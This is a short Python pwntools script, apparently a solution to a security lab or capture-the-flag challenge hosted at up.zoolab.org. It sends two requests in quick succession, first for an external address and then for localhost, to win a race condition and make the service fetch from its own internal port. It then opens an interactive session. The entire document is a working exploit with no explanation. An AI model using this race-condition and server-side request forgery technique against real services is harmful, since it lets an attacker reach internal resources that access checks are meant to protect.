from pwn import *
import time

# need to wait the first connection failed, when reentrance will get from localhost

def exploit():

    conn = remote('up.zoolab.org', 10932)
    conn.sendline('g\n8.8.8.8/10000')

    #conn.sendline('example.com/80')
    time.sleep(0.0001)
    conn.sendline('g\nlocalhost/10000')
    #conn.sendline('localhost/10000')
    conn.interactive()

exploit()
